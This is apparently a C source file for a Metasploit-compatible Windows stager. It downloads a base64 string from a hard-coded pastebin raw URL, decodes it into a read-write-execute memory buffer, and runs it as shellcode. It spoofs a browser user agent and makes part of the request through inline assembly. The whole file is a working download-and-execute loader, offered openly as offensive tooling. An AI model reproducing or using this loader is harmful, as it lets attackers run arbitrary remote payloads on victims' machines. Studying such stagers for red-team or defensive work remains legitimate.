/*
 * A C-based stager client compat with the Metasploit Framework.
 *
 * Reads a b64 encoded string from pastebin, treats it as shellcode, and
 *    executes it.
 *
 * @author Dakota Nelson (dakota.w.nelson@gmail.com)
 *  based on a stager by Raphael Mudge (raffi@strategiccyber.com)
 *  Original code available at https://github.com/rsmudge/metasploit-loader
 * @license BSD License.
 *
 * Relevant messages:
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>

//#include "block_api.s"

//extern void api_call();

/* a quick routine to quit and report why we quit */
void punt(char * error) {
  printf("Bad things: %s\n", error);
  printf("Official error: %lu\n", GetLastError());
  exit(1);
}

int main(int argc, char * argv[]) {
  printf("doing a thing...\n");
  BYTE * buffer;
  void (*function)();
  DWORD size;
  HINTERNET hSession = NULL,
            hRequest = NULL,
            hConnect = NULL;

  LPSTR pszOutBuffer;
  DWORD dwSize = 0;
  DWORD dwDownloaded = 0;

  /* see:
   * msdn.microsoft.com/en-us/library/windows/desktop/aa384098(v=vs.85).aspx 
   * */
  hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME,
                         WINHTTP_NO_PROXY_BYPASS, 0);

  if(hSession == NULL) {
    punt("could not open HTTP session\n");
  }

  /*if (argc != 3) {
    printf("%s [host] [port]\n", argv[0]);
    exit(1);
  }*/

  /* connect to target host */
  LPCWSTR host = L"www.pastebin.com";

  // if (hSession)
  hConnect = WinHttpConnect(hSession, host,
                          INTERNET_DEFAULT_HTTP_PORT, 0);

  if(hConnect == NULL) {
    punt("could not open HTTP connection\n");
    if (hSession) WinHttpCloseHandle(hSession);
  }

  /* send HTTP GET to target host */
  LPCWSTR path = L"/raw.php?i=PDg27FPb";

  /*
  xor ebx ebx            ; null out ebx
  push HTTP_OPEN_FLAGS   ; Flags [7]
  push ebx               ; AcceptTypes (NULL) [6]
  push ebx               ; Referrer (NULL) [5]
  push ebx               ; Version (NULL)  [4]
  push edi               ; ObjectName (URI) [3]
  push ebx               ; Verb (GET method) (NULL)  [2]
  push eax               ; Connect handler returned by WinHttpConnect [1]
  push 0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
  call ebp
  xchg esi, eax          ; save HttpRequest handler in esi
  */

  /*
  xor %ebx %ebx           ; null out ebx
  push HTTP_OPEN_FLAGS    ; Flags [7]
  push %ebx               ; AcceptTypes (NULL) [6]
  push %ebx               ; Referrer (NULL) [5]
  push %ebx               ; Version (NULL)  [4]
  push %edi               ; ObjectName (URI) [3]
  push %ebx               ; Verb (GET method) (NULL)  [2]
  push %eax               ; Connect handler returned by WinHttpConnect [1]
  push $0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
  call %ebp
  xchg %eax, %esi         ; save HttpRequest handler in esi
  */

  printf("HERE WE GOOOOOOOOOOOOOOOOOOOOOOOOOOOO\n");
  asm("xor %%ebx, %%ebx\n\t"
  "push %%ebx\n\t"
  "push %%ebx\n\t"
  "push %%ebx\n\t"
  "push %%ebx\n\t"
  "push %[path]\n\t"
  "push %%ebx\n\t"
  "push %[hConnect]\n\t"
  "call *%[function]\n\t"
  //"push $0x5BB31098\n\t"
  //"call *%[api_call]\n\t"
  "xchg %%eax, %[hRequest]"
  : [hRequest] "=r" (hRequest)
  : [hConnect] "r" (hConnect),
    [path] "r" (path),
    [function] "r" (WinHttpOpenRequest)
    //[api_call] "r" (api_call)
  : "eax", "ebx", "ecx"
  );
  printf("HOLY FUCK WE OUT\n");

  // if (hConnect)
  /*hRequest = WinHttpOpenRequest(hConnect,
                                L"GET",
                                path,
                                NULL,
                                WINHTTP_NO_REFERER,
                                WINHTTP_DEFAULT_ACCEPT_TYPES,
                                0);*/

  if(hRequest == NULL) {
    punt("could not open HTTP request\n");
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
  }

  BOOL success = WinHttpSendRequest(hRequest, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS,
                                    0,
                                    WINHTTP_NO_REQUEST_DATA,
                                    0,
                                    0,
                                    0);

  if(!success) {
    punt("could not send HTTP request\n");
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
  }

  /* receive response from server */
  if (!WinHttpReceiveResponse(hRequest, NULL)) {
    punt("no response received\n");
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
  }

  WinHttpQueryDataAvailable(hRequest, &dwSize);
  pszOutBuffer = malloc(dwSize+1);

  ZeroMemory(pszOutBuffer, dwSize+1);

  WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                  dwSize, &dwDownloaded);
  // request handle, buffer to write to, number of bytes to read,
  // number of bytes actually read

  printf("%s\n", pszOutBuffer);

  if (hRequest) WinHttpCloseHandle(hRequest);
  if (hConnect) WinHttpCloseHandle(hConnect);
  if (hSession) WinHttpCloseHandle(hSession);

  BOOL win = CryptStringToBinary(pszOutBuffer, dwSize, CRYPT_STRING_BASE64,
                                 NULL, &size, NULL, NULL);

  /* allocate a RWX buffer */
  buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (buffer == NULL) {
    punt("could not allocate buffer\n");
  }

  /* read <size> characters, b64 decode, then treat as code, and
   * toss our newly found shellcode into the buffer */

  win = CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64,
                                 buffer, &size, NULL, NULL);

  if(!win) {
    printf("Could not decode pastebin b64 string.\n");
  }

  free(pszOutBuffer);

  /* cast our buffer as a function and call it */
  function = (void (*)())buffer;
  function();

  return 0;
}

